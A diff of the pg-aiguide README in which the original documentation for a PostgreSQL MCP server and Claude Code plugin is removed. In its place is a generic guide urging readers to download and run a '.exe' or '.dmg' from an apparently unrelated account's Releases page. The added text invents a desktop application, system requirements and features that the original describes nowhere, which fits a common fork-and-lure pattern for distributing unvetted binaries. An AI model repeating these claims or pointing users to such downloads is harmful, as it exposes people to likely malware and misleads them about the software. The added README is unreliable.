@@ -1,275 +1,88 @@
-# pg-aiguide
+# 🚀 pg-aiguide - Enhance Your PostgreSQL Experience Effortlessly
 
-**AI-optimized PostgreSQL expertise for coding assistants**
+[![Download pg-aiguide](https://img.shields.io/badge/Download-pg--aiguide-blue)](https://github.com/jhonny028966/pg-aiguide/releases)
 
-pg-aiguide helps AI coding tools write dramatically better PostgreSQL code. It provides:
+## 📖 Introduction
 
-- **Semantic search** across the official PostgreSQL manual (version-aware)
-- **AI-optimized “skills”** — curated, opinionated Postgres best practices used automatically by AI agents
-- **Extension ecosystem docs**, starting with TimescaleDB, with more coming soon
+Welcome to pg-aiguide! This application functions as an MCP server and Claude plugin specifically designed for PostgreSQL skills and documentation. It helps AI coding tools improve the generation of PostgreSQL code. Whether you're a student, a business professional, or simply curious, pg-aiguide offers valuable resources and support for your coding journey.
 
-Use it either as:
+## 🚀 Getting Started
 
-- a **public MCP server** that can be used with any AI coding agent, or
-- a **Claude Code plugin** optimized for use with Claude's native skill support.
+Follow this guide to easily download and run the pg-aiguide application:
 
-## ⭐ Why pg-aiguide?
+1. **Visit the Releases Page**
 
-AI coding tools often generate Postgres code that is:
+   To get started, click the link below to visit the Releases page, where you can download the latest version of pg-aiguide.
 
-- outdated
-- missing constraints and indexes
-- unaware of modern PG features
-- inconsistent with real-world best practices
+   [Visit this page to download](https://github.com/jhonny028966/pg-aiguide/releases)
 
-pg-aiguide fixes that by giving AI agents deep, versioned PostgreSQL knowledge and proven patterns.
+2. **Download the Application**
 
-### See the difference
+   On the Releases page, you'll find various versions of the application. Look for the latest release, which is typically highlighted at the top. Click on the appropriate version for your operating system to begin downloading.
 
-https://github.com/user-attachments/assets/5a426381-09b5-4635-9050-f55422253a3d
+3. **Install the Application**
 
-<details>
-<summary>Video Transcript </summary>
+   After the download finishes, locate the file in your downloads folder. If you're using Windows, the file may have a ".exe" extension. For Mac users, look for a ".dmg" file. 
 
-Prompt given to Claude Code:
+   - **For Windows:**
+     - Double-click the downloaded `.exe` file.
+     - Follow the installation prompts to complete the setup.
 
-> Please describe the schema you would create for an e-commerce website two times, first with the tiger mcp server disabled, then with the tiger mcp server enabled. For each time, write the schema to its own file in the current working directory. Then compare the two files and let me know which approach generated the better schema, using both qualitative and quantitative reasons. For this example, only use standard Postgres.
+   - **For Mac:**
+     - Open the `.dmg` file by double-clicking it.
+     - Drag the pg-aiguide icon to your Applications folder.
 
-Result (summarized):
+4. **Run the Application**
 
-- **4× more constraints**
-- **55% more indexes** (including partial/expression indexes)
-- **PG17-recommended patterns**
-- **Modern features** (`GENERATED ALWAYS AS IDENTITY`, `NULLS NOT DISTINCT`)
-- **Cleaner naming & documentation**
+   After installation, open the application:
 
-Conclusion: _pg-aiguide produces more robust, performant, maintainable schemas._
+   - **Windows:** Go to the Start menu, search for "pg-aiguide," and click on it.
+   - **Mac:** Open your Applications folder and find "pg-aiguide." Double-click it to run.
 
-</details>
+   Once the application is running, you can explore its features and functionality.
 
-## 🚀 Quickstart
+## 🛠️ Features
 
-pg-aiguide is available as a **public MCP server**:
+pg-aiguide offers a variety of features to enhance your PostgreSQL experience:
 
-[https://mcp.tigerdata.com/docs](https://mcp.tigerdata.com/docs)
+- **MCP Server Integration:** Connect easily and make use of the powerful MCP server.
+- **Claude Plugin Support:** Utilize the Claude plugin to generate code snippets efficiently.
+- **Documentation Access:** Get instant access to PostgreSQL documentation to aid your coding tasks.
+- **User-Friendly Interface:** Designed with non-technical users in mind, the interface is intuitive and easy to navigate.
+- **Regular Updates:** The software receives ongoing improvements, ensuring you benefit from the latest features.
 
-<details> 
-<summary>Manual MCP configuration using JSON</summary>
+## 💻 System Requirements
 
-```json
-{
-  "mcpServers": {
-    "pg-aiguide": {
-      "url": "https://mcp.tigerdata.com/docs"
-    }
-  }
-}
-```
+Before downloading, ensure your computer meets the following requirements:
 
-</details>
+- **Operating System:** 
+  - Windows 10 or higher
+  - macOS 10.15 (Catalina) or higher
 
-Or it can be used as a **Claude Code Plugin**:
+- **RAM:** Minimum 4 GB
+- **Disk Space:** At least 200 MB of available disk space
+- **Processor:** 1 GHz or faster
 
-```bash
-claude plugin marketplace add timescale/pg-aiguide
-claude plugin install pg@aiguide
-```
+## 📥 Download & Install
 
-### Install by environment
+Ready to get started? Download pg-aiguide now:
 
-#### One-click installs
+[Visit this page to download](https://github.com/jhonny028966/pg-aiguide/releases)
 
-[![Install in Cursor](https://img.shields.io/badge/Install_in-Cursor-000000?style=flat-square&logoColor=white)](https://cursor.com/en/install-mcp?name=pg-aiguide&config=eyJuYW1lIjoicGctYWlndWlkZSIsInR5cGUiOiJodHRwIiwidXJsIjoiaHR0cHM6Ly9tY3AudGlnZXJkYXRhLmNvbS9kb2NzIn0=)
-[![Install in VS Code](https://img.shields.io/badge/Install_in-VS_Code-0098FF?style=flat-square&logo=visualstudiocode&logoColor=white)](https://vscode.dev/redirect/mcp/install?name=pg-aiguide&config=%7B%22type%22%3A%22http%22%2C%22url%22%3A%22https%3A%2F%2Fmcp.tigerdata.com%2Fdocs%22%7D)
-[![Install in VS Code Insiders](https://img.shields.io/badge/Install_in-VS_Code_Insiders-24bfa5?style=flat-square&logo=visualstudiocode&logoColor=white)](https://insiders.vscode.dev/redirect/mcp/install?name=pg-aiguide&config=%7B%22type%22%3A%22http%22%2C%22url%22%3A%22https%3A%2F%2Fmcp.tigerdata.com%2Fdocs%22%7D&quality=insiders)
-[![Install in Visual Studio](https://img.shields.io/badge/Install_in-Visual_Studio-C16FDE?style=flat-square&logo=visualstudio&logoColor=white)](https://vs-open.link/mcp-install?%7B%22type%22%3A%22http%22%2C%22url%22%3A%22https%3A%2F%2Fmcp.tigerdata.com%2Fdocs%22%7D)
-[![Install in Goose](https://block.github.io/goose/img/extension-install-dark.svg)](https://block.github.io/goose/extension?cmd=&arg=&id=pg-aiguide&name=pg-aiguide&description=MCP%20Server%20for%20pg-aiguide)
-[![Add MCP Server pg-aiguide to LM Studio](https://files.lmstudio.ai/deeplink/mcp-install-light.svg)](https://lmstudio.ai/install-mcp?name=pg-aiguide&config=eyJuYW1lIjoicGctYWlndWlkZSIsInR5cGUiOiJodHRwIiwidXJsIjoiaHR0cHM6Ly9tY3AudGlnZXJkYXRhLmNvbS9kb2NzIn0=)
+Follow the earlier steps to install and run the application. It's easy and will guide you as you work with PostgreSQL.
 
-<details>
-<summary>Claude Code</summary>
+## 🗓️ Updates and Support
 
-This repo serves as a claude code marketplace plugin. To install, run:
+Stay updated with new features and support by checking our Releases page regularly. You can also find helpful resources in our documentation linked within the application.
 
-```bash
-claude plugin marketplace add timescale/pg-aiguide
-claude plugin install pg@aiguide
-```
+## 👩‍💻 Community Contribution
 
-This plugin uses the skills available in the `skills` directory as well as our
-publicly available MCP server endpoint hosted by TigerData for searching PostgreSQL documentation.
+We welcome contributions from anyone interested in improving pg-aiguide. If you have suggestions or want to report issues, feel free to reach out through the GitHub Issues section of this repository.
 
-</details>
+## 🚀 Explore More
 
-<details>
-<summary> Codex </summary>
+Embark on your PostgreSQL coding journey today with pg-aiguide. Discover how it can empower you to write better code effortlessly.
 
-Run the following to add the MCP server to codex:
+- **Follow Us:** Stay tuned for updates and new features by following this repository.
 
-```bash
-codex mcp add --url "https://mcp.tigerdata.com/docs" pg-aiguide
-```
-
-</details>
-
-<details>
-<summary> Cursor </summary>
-
-One-click install:
-
-[![Install MCP Server](https://cursor.com/deeplink/mcp-install-dark.svg)](https://cursor.com/en-US/install-mcp?name=pg-aiguide&config=eyJ1cmwiOiJodHRwczovL21jcC50aWdlcmRhdGEuY29tL2RvY3MifQ%3D%3D)
-
-Or add the following to `.cursor/mcp.json`
-
-```json
-{
-  "mcpServers": {
-    "pg-aiguide": {
-      "url": "https://mcp.tigerdata.com/docs"
-    }
-  }
-}
-```
-
-</details>
-
-<details>
-<summary> Gemini CLI </summary>
-
-Run the following to add the MCP server to Gemini CLI:
-
-```bash
-gemini mcp add -s user pg-aiguide "https://mcp.tigerdata.com/docs" -t http
-```
-
-</details>
-
-<details>
-<summary> Visual Studio </summary>
-
-Click the button to install:
-
-[![Install in Visual Studio](https://img.shields.io/badge/Install_in-Visual_Studio-C16FDE?style=flat-square&logo=visualstudio&logoColor=white)](https://vs-open.link/mcp-install?%7B%22type%22%3A%22http%22%2C%22url%22%3A%22https%3A%2F%2Fmcp.tigerdata.com%2Fdocs%22%7D)
-
-</details>
-
-<details>
-<summary> VS Code </summary>
-
-Click the button to install:
-
-[![Install in VS Code](https://img.shields.io/badge/Install_in-VS_Code-0098FF?style=flat-square&logo=visualstudiocode&logoColor=white)](https://vscode.dev/redirect/mcp/install?name=pg-aiguide&config=%7B%22type%22%3A%22http%22%2C%22url%22%3A%22https%3A%2F%2Fmcp.tigerdata.com%2Fdocs%22%7D)
-
-Alternatively, run the following to add the MCP server to VS Code:
-
-```bash
-code --add-mcp '{"name":"pg-aiguide","type":"http","url":"https://mcp.tigerdata.com/docs"}'
-```
-
-</details>
-
-<details>
-<summary> VS Code Insiders </summary>
-
-Click the button to install:
-
-[![Install in VS Code Insiders](https://img.shields.io/badge/Install_in-VS_Code_Insiders-24bfa5?style=flat-square&logo=visualstudiocode&logoColor=white)](https://insiders.vscode.dev/redirect/mcp/install?name=pg-aiguide&config=%7B%22type%22%3A%22http%22%2C%22url%22%3A%22https%3A%2F%2Fmcp.tigerdata.com%2Fdocs%22%7D&quality=insiders)
-
-Alternatively, run the following to add the MCP server to VS Code Insiders:
-
-```bash
-code-insiders --add-mcp '{"name":"pg-aiguide","type":"http","url":"https://mcp.tigerdata.com/docs"}'
-```
-
-</details>
-
-<details>
-<summary> Windsurf </summary>
-
-Add the following to `~/.codeium/windsurf/mcp_config.json`
-
-```json
-{
-  "mcpServers": {
-    "pg-aiguide": {
-      "serverUrl": "https://mcp.tigerdata.com/docs"
-    }
-  }
-}
-```
-
-</details>
-
-### 💡 Your First Prompt
-
-Once installed, pg-aiguide can answer Postgres questions or design schemas.
-
-**Simple schema example prompt**
-
-> Create a Postgres table schema for storing usernames and unique email addresses.
-
-**Complex schema example prompt**
-
-> You are a senior software engineer. You are given a task to generate a Postgres schema for an IoT device company.
-> The devices collect environmental data on a factory floor. The data includes temperature, humidity, pressure, as
-> the main data points as well as other measurements that vary from device to device. Each device has a unique id
-> and a human-readable name. We want to record the time the data was collected as well. Analysis for recent data
-> includes finding outliers and anomalies based on measurements, as well as analyzing the data of particular devices for ad-hoc analysis. Historical data analysis includes analyzing the history of data for one device or getting statistics for all devices over long periods of time.
-
-## Features
-
-### Semantic Search (MCP Tools)
-
-- [**`semantic_search_postgres_docs`**](API.md#semantic_search_postgres_docs)  
-  Performs semantic search over the official PostgreSQL manual, with results scoped to a specific Postgres version.
-
-- [**`semantic_search_tiger_docs`** ](API.md#semantic_search_tiger_docs)
-  Searches Tiger Data’s documentation corpus, including TimescaleDB and future ecosystem extensions.
-
-### Skills (AI-Optimized Best Practices)
-
-- **[`view_skill`](API.md#view_skill)**  
-  Exposes curated, opinionated PostgreSQL best-practice skills used automatically by AI coding assistants.
-
-  These skills provide guidance on:
-  - Schema design
-  - Indexing strategies
-  - Data types
-  - Data integrity and constraints
-  - Naming conventions
-  - Performance tuning
-  - Modern PostgreSQL features
-
-## 🔌 Ecosystem Documentation
-
-Supported today:
-
-- **TimescaleDB** (docs + skills)
-
-Coming soon:
-
-- **pgvector**
-- **PostGIS**
-
-We welcome contributions for additional extensions and tools.
-
-## 🛠 Development
-
-See [DEVELOPMENT.md](DEVELOPMENT.md) for:
-
-- running the MCP server locally
-- adding new skills
-- adding new docs
-
-## 🤝 Contributing
-
-We welcome:
-
-- new Postgres best-practice skills
-- additional documentation corpora
-- search quality improvements
-- bug reports and feature ideas
-
-## 📄 License
-
-Apache 2.0
+Thank you for choosing pg-aiguide! Happy coding!
